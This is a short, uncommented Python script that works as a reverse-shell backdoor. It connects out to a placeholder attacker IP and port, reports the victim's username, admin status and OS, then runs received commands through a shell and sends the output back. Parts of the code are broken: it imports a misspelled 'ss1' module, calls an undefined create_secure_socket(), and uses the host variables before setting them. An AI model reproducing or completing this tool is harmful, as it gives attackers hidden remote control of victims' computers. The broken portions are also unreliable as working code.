

import socket
import subprocess
import os
import base64
import ctypes
import platform
import time
import ss1

def inbound():
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except Exception:
            sock.close()

def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf8'))
    sock.send(response)

def session_handler():
    try:
        sock.connect((host_ip, host_port))
        outbound(os.getlogin())
        outbound(ctypes.windll.shell32.IsUserAnAdmin())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        while True:
            message = inbound()
            if message == 'exit':
                sock.close()
                break
            elif message == 'persist':
                pass
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('Invalid directory. Try again.')
                    continue
            elif message == 'background':
                pass
            elif message == 'help':
                pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
    except ConnectionRefusedError:
        pass

if __name__ == '__main__':
    secure_sock = create_secure_socket()
    secure_sock.connect((host_ip, host_port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = 'INPUT_IP_HERE'
    host_port = 'INPUT_PORT_HERE'  # Ensure this is an integer or a string that represents an integer
    session_handler()
